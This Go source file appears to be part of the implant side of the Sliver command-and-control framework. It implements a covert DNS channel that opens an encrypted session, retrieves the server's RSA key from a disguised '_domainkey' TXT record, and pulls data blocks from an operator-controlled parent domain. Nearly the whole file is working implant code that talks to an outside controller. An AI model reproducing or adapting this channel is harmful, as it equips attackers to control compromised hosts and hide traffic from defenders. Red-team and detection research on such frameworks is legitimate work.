package main

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"log"
	insecureRand "math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// RecvBlock - Single block from server
type RecvBlock struct {
	Index int
	Data  []byte
}

// BlockReassembler - Data is encoded and split into `Blocks`
type BlockReassembler struct {
	ID   string
	Size int
	Recv chan RecvBlock
}

const (
	domainKeySubdomain = "_domainkey"
	nonceStdSize       = 6

	// (n*8 + 4) / 5 = 63 means we can encode 39 bytes
	byteBlockSize = 39

	maxFetchTxts = 200 // How many txts to request at a time
)

var (
	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
)

func dnsStartSession(parentDomain string) (string, AESKey, error) {
	sessionKey := RandomAESKey()
	pubKey := dnsGetServerPublicKey()

	data, err := RSAEncrypt(sessionKey[:], pubKey)
	if err != nil {
		return "", AESKey{}, err
	}
	nonce := dnsNonce(nonceStdSize)
	encoded := base32.StdEncoding.EncodeToString(data)
	txts, err := net.LookupTXT(fmt.Sprintf("%s.%s.%s._si.%s", nonce, encoded, sliverName, parentDomain))
	if 0 < len(txts) {
		sessionID, err := GCMDecrypt(sessionKey, []byte(txts[0]))
		if err != nil {
			return "", AESKey{}, err
		}
		return string(sessionID), sessionKey, nil
	}
	return "", AESKey{}, errors.New("Invalid TXT response to session init")
}

func dnsGetServerPublicKey() *rsa.PublicKey {
	pubKeyPEM, err := LookupDomainKey(sliverName, dnsParent)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch domain key %v", err)
		// {{end}}
		return nil
	}

	pubKeyBlock, _ := pem.Decode([]byte(pubKeyPEM))
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("failed to parse certificate PEM")
		// {{end}}
		return nil
	}

	err = rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if err == nil {
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}
	// {{if .Debug}}
	log.Printf("Invalid certificate %v", err)
	// {{end}}
	return nil
}

// LookupDomainKey - Attempt to get the server's RSA public key
func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
	selector = strings.ToLower(selector)
	nonce := dnsNonce(nonceStdSize)
	subdomain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeySubdomain, parentDomain)
	txts, err := net.LookupTXT(subdomain)
	if err != nil {
		return nil, err
	}
	log.Printf("txts = %v err = %v", txts, err)
	if len(txts) == 0 {
		return nil, errors.New("Invalid _domainkey response")
	}

	fields := strings.Split(txts[0], ".")
	if len(fields) < 2 {
		return nil, errors.New("Invalid _domainkey response")
	}
	log.Printf("Fetching Block ID = %s (Size = %s)", fields[0], fields[1])
	return getBlock(parentDomain, fields[0], fields[1])
}

// dnsNonce - Generate a nonce of a given size
func dnsNonce(size int) string {
	insecureRand.Seed(time.Now().UnixNano())
	nonce := []rune{}
	for i := 0; i < size; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		nonce = append(nonce, dnsCharSet[index])
	}
	return string(nonce)
}

func sendBlock(parentDomain string, data []byte) error {

	return nil
}

func getBlock(parentDomain string, blockID string, size string) ([]byte, error) {
	n, err := strconv.Atoi(size)
	if err != nil {
		return nil, err
	}
	reasm := &BlockReassembler{
		ID:   blockID,
		Size: n,
		Recv: make(chan RecvBlock, n),
	}

	var wg sync.WaitGroup
	data := make([][]byte, reasm.Size)

	fetchTxts := maxFetchTxts
	if reasm.Size < maxFetchTxts {
		fetchTxts = reasm.Size
	}

	for index := 0; index < reasm.Size; index += fetchTxts {
		wg.Add(1)
		go fetchRecvBlock(parentDomain, reasm, index, index+fetchTxts, &wg)
	}
	done := make(chan bool)
	go func() {
		for block := range reasm.Recv {
			data[block.Index] = block.Data
		}
		done <- true
	}()
	wg.Wait()
	close(reasm.Recv)
	<-done // Avoid race where range of reasm.Recv isn't complete

	msg := []byte{}
	for _, buf := range data {
		msg = append(msg, buf...)
	}
	nonce := dnsNonce(nonceStdSize)
	go net.LookupTXT(fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain))
	return msg, nil
}

func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
	defer wg.Done()
	nonce := dnsNonce(nonceStdSize)
	subdomain := fmt.Sprintf("_%s.%d.%d.%s._b.%s", nonce, start, stop, reasm.ID, parentDomain)
	log.Printf("[dns] fetch -> %s", subdomain)
	txts, err := net.LookupTXT(subdomain)
	log.Printf("[dns] fetched %d txt record(s)", len(txts))
	if err != nil {
		log.Printf("Failed to fetch blocks %v", err)
	}
	for _, txt := range txts {
		// Split on delim '.' because Windows strcat's multiple TXT records
		for _, record := range strings.Split(txt, ".") {
			if len(record) == 0 {
				continue
			}
			log.Printf("Decoding TXT record: %s", record)
			rawBlock, err := base64.RawStdEncoding.DecodeString(record)
			if err != nil {
				log.Printf("Failed to decode raw block '%s'", rawBlock)
				continue
			}
			if len(rawBlock) < 4 {
				log.Printf("Invalid raw block size %d", len(rawBlock))
				continue
			}
			seqBuf := make([]byte, 4)
			copy(seqBuf, rawBlock[:4])
			seq := int(binary.LittleEndian.Uint32(seqBuf))
			log.Printf("seq = %d (%d bytes)", seq, len(rawBlock[4:]))
			reasm.Recv <- RecvBlock{
				Index: seq,
				Data:  rawBlock[4:],
			}
		}
	}
}
